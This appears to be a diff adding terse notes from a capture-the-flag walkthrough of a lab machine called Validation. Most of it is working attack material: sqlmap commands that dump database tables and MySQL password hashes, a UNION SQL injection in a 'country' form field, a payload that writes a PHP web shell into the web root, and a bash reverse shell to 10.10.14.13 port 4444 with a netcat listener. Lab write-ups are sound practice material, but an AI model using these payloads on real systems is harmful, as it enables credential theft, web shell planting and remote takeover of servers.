@@ -47,3 +47,112 @@ available databases [5]:
 
 
 [+]Tables Info
+sqlmap -r validation.req  --tables -D mysql
+
+[INFO] fetching tables for database: 'mysql'
+Database: mysql
+[32 tables]
++----------------------------------------------------+
+| user                                               |
+| column_stats                                       |
+| columns_priv                                       |
+| db                                                 |
+| event                                              |
+| func                                               |
+| general_log                                        |
+| global_priv                                        |
+| gtid_slave_pos                                     |
+| help_category                                      |
+| help_keyword                                       |
+| help_relation                                      |
+| help_topic                                         |
+| index_stats                                        |
+| innodb_index_stats                                 |
+| innodb_table_stats                                 |
+| plugin                                             |
+| proc                                               |
+| procs_priv                                         |
+| proxies_priv                                       |
+| roles_mapping                                      |
+| servers                                            |
+| slow_log                                           |
+| table_stats                                        |
+| tables_priv                                        |
+| time_zone                                          |
+| time_zone_leap_second                              |
+| time_zone_name                                     |
+| time_zone_transition                               |
+| time_zone_transition_type                          |
+| transaction_registry                               |
++----------------------------------------------------+
+
+
+sqlmap -r validation.req --password
+
+[22:10:53] [WARNING] no clear password(s) found                                               
+database management system users password hashes:
+[*] mariadb.sys [1]:
+    password hash: NULL
+[*] mysql [1]:
+    password hash: invalid
+[*] root [1]:
+    password hash: invalid
+[*] uhc [1]:
+    password hash: *C6A38A5736CBA87E617301ECAB64184671128718
+
+
+[22:14:35] [INFO] fetching database users
+database management system users [5]:
+[*] ',(CASE WHEN (9340=9340) THEN '1' ELSE '0' END)),'
+[*] 'mariadb.sys'@'localhost'
+[*] 'mysql'@'localhost'
+[*] 'root'@'localhost'
+[*] 'uhc'@'localhost'
+
+
+[+]UNION-SQLI[+]
+- Repeater Post
+Cookie: user=21232f297a57a5a743894a0e4a801fc3
+Upgrade-Insecure-Requests: 1
+username=enum&country=Brazil' union select 1-- -
+
+- Repeater Response
+Set-Cookie: user=da45ec4be6574774008df9be683a4778
+
+- Use the cookie user response to view Union Attack
+
+- kyra
+- 1
+
+
+[+]SQLI-RCE[+]
+
+username=union&country=Azerbaijan' union select "hello world"-- -
+RES: *hello world
+
+
+[+]PHP WEB SHELL
+Payload =
+<?php
+    {
+        system($_GET['cmd']);
+    }
+?>
+username=revershell&country=Azerbaijan' union select "<?php SYSTEM($_REQUEST['cmd']) ?>"INTO OUTFILE '/var/www/html/shell.php'-- -
+capture cookie session response with burp
+
+- http://10.10.11.116/shell.php
+ Warning: system(): Cannot execute a blank command in /var/www/html/shell.php on line 1 (Ready only add : shell.php?cmd=whoami)
+ 
+ - http://10.10.11.116/shell.php?cmd=whoami
+ www-data
+ 
+ [+]REVERSHELL[+]
+ http://10.10.11.116/shell.php?cmd= >> Burp Method POST
+ cmd=bash+-c+"bash+-i+>%26+/dev/tcp/10.10.14.13/4444+0>%261" >> URL Encode
+ nc -lvnp 4444
+ 
+ [+]USERFLAG[+]
+ www-data@validation:/home/htb$ cat user.txt
+ 9d60c098ca9838060aac44bf70499f84
+ 
